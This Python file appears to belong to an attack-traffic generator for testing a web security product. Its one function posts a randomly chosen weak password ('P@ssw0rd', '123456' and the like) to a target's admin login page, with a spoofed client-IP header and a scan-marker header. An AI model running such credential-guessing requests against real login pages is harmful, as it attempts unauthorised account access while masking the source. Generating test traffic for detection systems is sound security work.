import random
import requests

# send weak passwords from a list to /?your-admin-logon-page
def weak_password(target, source_ip, user_agent, **kwargs):

    #usernames and passwords to try
    cred_list = [
                    { 'username': 'site-admin-rp3lfvf@yahoo.com', 'password': 'P@ssw0rd' },
                    { 'username': 'site-admin-rp3lfvf@yahoo.com', 'password': 'password1' },
                    { 'username': 'site-admin-rp3lfvf@yahoo.com', 'password': '123456' }
                ]


    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip),
               'Content-Type': 'application/x-www-form-urlencoded',
               'X-ThreatX-Scan': 'weak_password'
              }

    cred = random.choice(cred_list)

    attack = {
             "method": "POST",
             "url": "{}/?your-admin-logon-page".format(target),
             "payload": {"log": cred['username'], "pwd": cred['password']}
             }

    response = requests.request(attack['method'], attack['url'], headers=headers, data=attack['payload']).status_code

    return("weak_password: sent password '{}' to {}/?target=your-admin-logon-page".format(cred['password'],target))
